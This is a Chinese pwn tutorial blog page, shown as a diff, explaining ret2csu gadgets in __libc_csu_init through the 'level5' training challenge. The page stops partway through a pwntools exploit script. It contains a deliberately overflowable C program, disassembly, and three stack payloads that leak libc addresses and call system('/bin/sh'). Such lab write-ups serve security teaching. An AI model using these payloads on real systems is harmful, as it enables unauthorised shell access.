@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  <meta name="baidu-site-verification" content="L6Lm9d5Crl">
+  
+  
+  
+  
+  <title>gadget_libc_csu_init | Thriumph</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="原理程序在编译的过程中通常会加入一些通用函数进行初始化操作，很多程序的源码不同，但初始化的过程是相同的，针对这些初始化函数，可以提取通用的gadgets使用。">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="gadget_libc_csu_init">
+<meta property="og:url" content="http://yoursite.com/gadget-libc-csu-init.html">
+<meta property="og:site_name" content="Thriumph">
+<meta property="og:description" content="原理程序在编译的过程中通常会加入一些通用函数进行初始化操作，很多程序的源码不同，但初始化的过程是相同的，针对这些初始化函数，可以提取通用的gadgets使用。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/images%5Cgadget-libc-csu-init%5Col-1566122435075.jpg">
+<meta property="og:image" content="http://yoursite.com/images%5Cgadget-libc-csu-init%5Col-1566122435075.jpg">
+<meta property="og:updated_time" content="2019-08-18T18:28:07.449Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="gadget_libc_csu_init">
+<meta name="twitter:description" content="原理程序在编译的过程中通常会加入一些通用函数进行初始化操作，很多程序的源码不同，但初始化的过程是相同的，针对这些初始化函数，可以提取通用的gadgets使用。">
+<meta name="twitter:image" content="http://yoursite.com/images%5Cgadget-libc-csu-init%5Col-1566122435075.jpg">
+  
+    <link rel="alternative" href="/atom.xml" title="Thriumph" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+  <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet">
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/avatar.png" class="js-avatar">
+            
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Thriumph</a></h1>
+        </hgroup>
+        
+        <p class="header-subtitle">路漫漫其修远兮，吾将上下而求索</p>
+        
+        
+            <form>
+                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder="搜索一下" autocomplete="off">
+            </form>
+            <div id="local-search-result"></div>
+        
+        
+            <script type="text/javascript">
+                (function() {
+                    'use strict';
+                    function getMatchData(keyword, data) {
+                        var matchData = [];
+                        for(var i =0;i<data.length;i++){
+                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
+                                matchData.push(data[i])
+                        }
+                        return matchData;
+                    }
+                    var $input = $('#local-search-input');
+                    var $resultContent = $('#local-search-result');
+                    $input.keyup(function(){
+                        $.ajax({
+                            url: '/search.json',
+                            dataType: "json",
+                            success: function( json ) {
+                                var str='<ul class=\"search-result-list\">';                
+                                var keyword = $input.val().trim().toLowerCase();
+                                $resultContent.innerHTML = "";
+                                if ($input.val().trim().length <= 0) {
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                }
+                                var results = getMatchData(keyword, json);
+                                if(results.length === 0){
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                } 
+                                for(var i =0; i<results.length; i++){
+                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
+                                }
+                                str += "</ul>";
+                                $resultContent.empty();
+                                $resultContent.append(str);
+                                $('#switch-area').hide();
+                            }
+                        });
+                    });
+                })();
+            </script>
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a  href="/">博客主页</a></li>
+                        
+                            <li><a  href="/archives/">所有文章</a></li>
+                        
+                            <li><a  href="/tags/">标签</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl qq"  target="_blank" href="#" title="qq">qq</a>
+                            
+                                <a class="fl mail"  target="_blank" href="#" title="mail">mail</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/HOOK技术/" style="font-size: 10px;">HOOK技术</a> <a href="/tags/PE文件/" style="font-size: 11.67px;">PE文件</a> <a href="/tags/c/" style="font-size: 10px;">c</a> <a href="/tags/kali/" style="font-size: 10px;">kali</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/pwnable-kr/" style="font-size: 18.33px;">pwnable.kr</a> <a href="/tags/re/" style="font-size: 13.33px;">re</a> <a href="/tags/wp/" style="font-size: 15px;">wp</a> <a href="/tags/加密算法/" style="font-size: 10px;">加密算法</a> <a href="/tags/汇编/" style="font-size: 11.67px;">汇编</a> <a href="/tags/注入技术/" style="font-size: 10px;">注入技术</a> <a href="/tags/脱壳/" style="font-size: 10px;">脱壳</a> <a href="/tags/补丁/" style="font-size: 10px;">补丁</a> <a href="/tags/计算机网络/" style="font-size: 16.67px;">计算机网络</a>
+                    </div>
+                </section>
+                
+                
+                
+                
+                <section class="switch-part switch-part3">
+                
+                    <div id="js-aboutme">网安界的小萌新，喜欢逆向，二进制，日常划水，嘻嘻嘻ヾ(≧▽≦*)o</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Thriumph</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/avatar.png" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Thriumph</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">路漫漫其修远兮，吾将上下而求索</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">博客主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="qq" target="_blank" href="#" title="qq">qq</a>
+                    
+                        <a class="mail" target="_blank" href="#" title="mail">mail</a>
+                    
+                </div>
+            </nav>
+        </header>
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-gadget-libc-csu-init" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/gadget-libc-csu-init.html" class="article-date">
+      <time datetime="2019-04-03T03:53:00.000Z" itemprop="datePublished">2019-04-03</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      gadget_libc_csu_init
+    </h1>
+  
+
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/二进制安全/">二进制安全</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p><code>程序在编译的过程中通常会加入一些通用函数进行初始化操作，很多程序的源码不同，但初始化的过程是相同的，针对这些初始化函数，可以提取通用的gadgets使用。</code></p>
+<a id="more"></a>
+
+<h1 id="libc-cus-init函数"><a href="#libc-cus-init函数" class="headerlink" title="_libc_cus_init函数"></a>_libc_cus_init函数</h1><p>主要针对64位程序的，与32位的栈传参不同的是，64位函数中函数前6个参数是通过寄存器传递的，但很难找到每一个寄存器对应的gadgets。可以利用x64的_libc_csu_init中的gadgets,这个函数是用来对libc进行初始化操作的，而且一般程序都会调用libc函数，所以这个函数一定会存在。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004005</span>C0 ; <span class="keyword">void</span> _libc_csu_init(<span class="keyword">void</span>)</span><br><span class="line">.text:<span class="number">00000000004005</span>C0                 <span class="keyword">public</span> __libc_csu_init</span><br><span class="line">.text:<span class="number">00000000004005</span>C0 __libc_csu_init proc near               ; DATA XREF: _start+<span class="number">16</span>o</span><br><span class="line">.text:<span class="number">00000000004005</span>C0                 push    r15</span><br><span class="line">.text:<span class="number">00000000004005</span>C2                 push    r14</span><br><span class="line">.text:<span class="number">00000000004005</span>C4                 mov     r15d, edi</span><br><span class="line">.text:<span class="number">00000000004005</span>C7                 push    r13</span><br><span class="line">.text:<span class="number">00000000004005</span>C9                 push    r12</span><br><span class="line">.text:<span class="number">00000000004005</span>CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:<span class="number">00000000004005</span>D2                 push    rbp</span><br><span class="line">.text:<span class="number">00000000004005</span>D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:<span class="number">00000000004005</span>DA                 push    rbx</span><br><span class="line">.text:<span class="number">00000000004005</span>DB                 mov     r14, rsi</span><br><span class="line">.text:<span class="number">00000000004005</span>DE                 mov     r13, rdx</span><br><span class="line">.text:<span class="number">00000000004005E1</span>                 sub     rbp, r12</span><br><span class="line">.text:<span class="number">00000000004005E4</span>                 sub     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">00000000004005E8</span>                 sar     rbp, <span class="number">3</span></span><br><span class="line">.text:<span class="number">00000000004005</span>EC                 call    _init_proc</span><br><span class="line">.text:<span class="number">00000000004005F</span>1                 test    rbp, rbp</span><br><span class="line">.text:<span class="number">00000000004005F</span>4                 jz      <span class="keyword">short</span> loc_400616</span><br><span class="line">.text:<span class="number">00000000004005F</span>6                 xor     ebx, ebx</span><br><span class="line">.text:<span class="number">00000000004005F</span>8                 nop     dword ptr [rax+rax+<span class="number">00000000</span>h]</span><br><span class="line">.text:<span class="number">0000000000400600</span></span><br><span class="line">.text:<span class="number">0000000000400600</span> loc_400600:                             ; CODE XREF: __libc_csu_init+<span class="number">54</span>j</span><br><span class="line">.text:<span class="number">0000000000400600</span>                 mov     rdx, r13</span><br><span class="line">.text:<span class="number">0000000000400603</span>                 mov     rsi, r14</span><br><span class="line">.text:<span class="number">0000000000400606</span>                 mov     edi, r15d</span><br><span class="line">.text:<span class="number">0000000000400609</span>                 call    qword ptr [r12+rbx*<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">000000000040060</span>D                 add     rbx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000400611</span>                 cmp     rbx, rbp</span><br><span class="line">.text:<span class="number">0000000000400614</span>                 jnz     <span class="keyword">short</span> loc_400600</span><br><span class="line">.text:<span class="number">0000000000400616</span></span><br><span class="line">.text:<span class="number">0000000000400616</span> loc_400616:                             ; CODE XREF: __libc_csu_init+<span class="number">34</span>j</span><br><span class="line">.text:<span class="number">0000000000400616</span>                 add     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">000000000040061</span>A                 pop     rbx</span><br><span class="line">.text:<span class="number">000000000040061B</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">000000000040061</span>C                 pop     r12</span><br><span class="line">.text:<span class="number">000000000040061</span>E                 pop     r13</span><br><span class="line">.text:<span class="number">0000000000400620</span>                 pop     r14</span><br><span class="line">.text:<span class="number">0000000000400622</span>                 pop     r15</span><br><span class="line">.text:<span class="number">0000000000400624</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000400624</span> __libc_csu_init endp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images%5Cgadget-libc-csu-init%5Col-1566122435075.jpg" alt>gadget1可以利用栈溢出构造栈上的数据从而控制rbx,rbp,r12,r13,r14,r15寄存器的数据。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br></pre></td></tr></table></figure>
+
+<p>将r13的值赋给rdx,r12的值赋给r14，将r15的值赋给edi,然后调用<code>call    qword ptr [r12+rbx*8]</code>通过控制r12和rbx的值来控制执行想要执行的函数。然后判断rbx+1是否与rbp相等，如果相等就继续执行，然后ret到想要继续执行的地址。</p>
+<h1 id="例：蒸米的level5"><a href="#例：蒸米的level5" class="headerlink" title="例：蒸米的level5"></a>例：蒸米的level5</h1><p>查看基本信息，开启了堆栈不可执行保护</p>
+<p><img src="/images%5Cgadget-libc-csu-init%5Col-1566122435075.jpg" alt></p>
+<h2 id="level-c"><a href="#level-c" class="headerlink" title="level.c"></a>level.c</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> _FORTIFY_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	write(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">	vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个程序仅仅只有一个buffer overflow，也没有任何的辅助函数可以使用，所以我们要先想办法泄露内存信息，找到system()的值，然后再传递“/bin/sh”到.bss段, 最后调用system(“/bin/sh”)。因为原程序使用了write()和read()函数，我们可以通过write()去输出write.got的地址，从而计算出libc.so在内存中的地址。但问题在于write()的参数应该如何传递，因为x64下前6个参数不是保存在栈中，而是通过寄存器传值。我们使用ROPgadget并没有找到类似于pop rdi, ret,pop rsi, ret这样的gadgets。但是在x64下有一些万能的gadgets可以利用。用objdump -d ./level5观察一下__libc_csu_init()这个函数。一般来说，只要程序调用了libc.so，程序都会有这个函数用来对libc进行初始化操作。 </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000004005</span>c0 &lt;__libc_csu_init&gt;:</span><br><span class="line">  <span class="number">4005</span>c0:	<span class="number">41</span> <span class="number">57</span>                	push   %r15</span><br><span class="line">  <span class="number">4005</span>c2:	<span class="number">41</span> <span class="number">56</span>                	push   %r14</span><br><span class="line">  <span class="number">4005</span>c4:	<span class="number">41</span> <span class="number">89</span> ff             	mov    %edi,%r15d</span><br><span class="line">  <span class="number">4005</span>c7:	<span class="number">41</span> <span class="number">55</span>                	push   %r13</span><br><span class="line">  <span class="number">4005</span>c9:	<span class="number">41</span> <span class="number">54</span>                	push   %r12</span><br><span class="line">  <span class="number">4005</span>cb:	<span class="number">4</span>c <span class="number">8</span>d <span class="number">25</span> <span class="number">3</span>e <span class="number">08</span> <span class="number">20</span> <span class="number">00</span> 	lea    <span class="number">0x20083e</span>(%rip),%r12        # <span class="number">600e10</span> &lt;__frame_dummy_init_array_entry&gt;</span><br><span class="line">  <span class="number">4005</span>d2:	<span class="number">55</span>                   	push   %rbp</span><br><span class="line">  <span class="number">4005</span>d3:	<span class="number">48</span> <span class="number">8</span>d <span class="number">2</span>d <span class="number">3</span>e <span class="number">08</span> <span class="number">20</span> <span class="number">00</span> 	lea    <span class="number">0x20083e</span>(%rip),%rbp        # <span class="number">600e18</span> &lt;__init_array_end&gt;</span><br><span class="line">  <span class="number">4005</span>da:	<span class="number">53</span>                   	push   %rbx</span><br><span class="line">  <span class="number">4005</span>db:	<span class="number">49</span> <span class="number">89</span> f6             	mov    %rsi,%r14</span><br><span class="line">  <span class="number">4005</span>de:	<span class="number">49</span> <span class="number">89</span> d5             	mov    %rdx,%r13</span><br><span class="line">  <span class="number">4005e1</span>:	<span class="number">4</span>c <span class="number">29</span> e5             	sub    %r12,%rbp</span><br><span class="line">  <span class="number">4005e4</span>:	<span class="number">48</span> <span class="number">83</span> ec <span class="number">08</span>          	sub    $<span class="number">0x8</span>,%rsp</span><br><span class="line">  <span class="number">4005e8</span>:	<span class="number">48</span> c1 fd <span class="number">03</span>          	sar    $<span class="number">0x3</span>,%rbp</span><br><span class="line">  <span class="number">4005</span>ec:	e8 <span class="number">0f</span> fe ff ff       	callq  <span class="number">400400</span> &lt;_init&gt;</span><br><span class="line">  <span class="number">4005f</span>1:	<span class="number">48</span> <span class="number">85</span> ed             	test   %rbp,%rbp</span><br><span class="line">  <span class="number">4005f</span>4:	<span class="number">74</span> <span class="number">20</span>                	je     <span class="number">400616</span> &lt;__libc_csu_init+<span class="number">0x56</span>&gt;</span><br><span class="line">  <span class="number">4005f</span>6:	<span class="number">31</span> db                	xor    %ebx,%ebx</span><br><span class="line">  <span class="number">4005f</span>8:	<span class="number">0f</span> <span class="number">1f</span> <span class="number">84</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> 	nopl   <span class="number">0x0</span>(%rax,%rax,<span class="number">1</span>)</span><br><span class="line">  <span class="number">4005f</span>f:	<span class="number">00</span> </span><br><span class="line">  <span class="number">400600</span>:	<span class="number">4</span>c <span class="number">89</span> ea             	mov    %r13,%rdx</span><br><span class="line">  <span class="number">400603</span>:	<span class="number">4</span>c <span class="number">89</span> f6             	mov    %r14,%rsi</span><br><span class="line">  <span class="number">400606</span>:	<span class="number">44</span> <span class="number">89</span> ff             	mov    %r15d,%edi</span><br><span class="line">  <span class="number">400609</span>:	<span class="number">41</span> ff <span class="number">14</span> dc          	callq  *(%r12,%rbx,<span class="number">8</span>)</span><br><span class="line">  <span class="number">40060</span>d:	<span class="number">48</span> <span class="number">83</span> c3 <span class="number">01</span>          	add    $<span class="number">0x1</span>,%rbx</span><br><span class="line">  <span class="number">400611</span>:	<span class="number">48</span> <span class="number">39</span> eb             	cmp    %rbp,%rbx</span><br><span class="line">  <span class="number">400614</span>:	<span class="number">75</span> ea                	jne    <span class="number">400600</span> &lt;__libc_csu_init+<span class="number">0x40</span>&gt;</span><br><span class="line">  <span class="number">400616</span>:	<span class="number">48</span> <span class="number">83</span> c4 <span class="number">08</span>          	add    $<span class="number">0x8</span>,%rsp</span><br><span class="line">  <span class="number">40061</span>a:	<span class="number">5b</span>                   	pop    %rbx</span><br><span class="line">  <span class="number">40061b</span>:	<span class="number">5</span>d                   	pop    %rbp</span><br><span class="line">  <span class="number">40061</span>c:	<span class="number">41</span> <span class="number">5</span>c                	pop    %r12</span><br><span class="line">  <span class="number">40061</span>e:	<span class="number">41</span> <span class="number">5</span>d                	pop    %r13</span><br><span class="line">  <span class="number">400620</span>:	<span class="number">41</span> <span class="number">5</span>e                	pop    %r14</span><br><span class="line">  <span class="number">400622</span>:	<span class="number">41</span> <span class="number">5f</span>                	pop    %r15</span><br><span class="line">  <span class="number">400624</span>:	c3                   	retq</span><br></pre></td></tr></table></figure>
+
+<p>先构造playload1,利用write()输出write的内存地址，gadget是call qword ptr[r12+rb*8],应该使用write.got的地址，再返回原程序中重复利用buffer overflow的漏洞，需要继续覆盖栈上的数据直到main()函数</p>
+<h2 id="playload1"><a href="#playload1" class="headerlink" title="playload1"></a>playload1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#rdi=edi=r15, rsi=r14, rdx=r13</span></span><br><span class="line"><span class="comment">#write(rdi=1,rsi=write_got,rdx=8)</span></span><br><span class="line">payload1 = <span class="string">"\x00"</span>*<span class="number">136</span></span><br><span class="line">payload1 += p64(<span class="number">0x400616</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(write_got) + p64(<span class="number">1</span>) + p64(<span class="number">0x400600</span>)</span><br><span class="line">payload1 += <span class="string">"\x00"</span>*<span class="number">56</span>  <span class="comment">#0x38</span></span><br><span class="line">payload1 += p64(main_addr)</span><br></pre></td></tr></table></figure>
+
+<p>exp收到write()的内存地址后，可以计算出system（）再内存中的地址，利用read()将system()的地址以及“/bin/sh”读入到bss.段内存中</p>
+<h2 id="playload2"><a href="#playload2" class="headerlink" title="playload2"></a>playload2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#rdi=edi=r15, rsi=r14, rdx=r13</span></span><br><span class="line"><span class="comment">#read(rdi=0,rsi=bss_addr,rdx=16)</span></span><br><span class="line">payload2 = <span class="string">"\x00"</span>*<span class="number">136</span></span><br><span class="line">payload2 += p64(<span class="number">0x400616</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got) + p64(<span class="number">16</span>) + p64(bss_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0x400600</span>)</span><br><span class="line">payload2 += <span class="string">"\x00"</span>*<span class="number">56</span></span><br><span class="line">payload2 += p64(main_addr)</span><br></pre></td></tr></table></figure>
+
+<p>最后调用system（）函数执行”/bin/sh”,system()的地址保存早。bss段的首地址上，”/bin/sh”的地址存在.bss段首地址+8字节上</p>
+<h2 id="playload3"><a href="#playload3" class="headerlink" title="playload3"></a>playload3</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#rdi=edi=r15, rsi=r14, rdx=r13</span></span><br><span class="line"><span class="comment">#system(rdi=bss_addr+8="/bin/sh\0")</span></span><br><span class="line">payload3 = <span class="string">"\x00"</span>*<span class="number">136</span></span><br><span class="line">                <span class="comment">#pop        junk      rbx      rbp         r12           r13         r14           r15          ret</span></span><br><span class="line">payload3 += p64(<span class="number">0x400616</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) +p64(bss_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(bss_addr+<span class="number">8</span>) + p64(<span class="number">0x400600</span>)</span><br><span class="line">payload3 += <span class="string">"\x00"</span>*<span class="number">56</span></span><br><span class="line">payload3 += p64(main_addr)</span><br></pre></td></tr></table></figure>
+
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'level5'</span>)</span><br><span class="line">libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./level5'</span>)</span><br><span class="line"><span class="comment">#p = remote('127.0.0.1',10001)</span></span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"write_got= "</span> + hex(write_got)</span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span 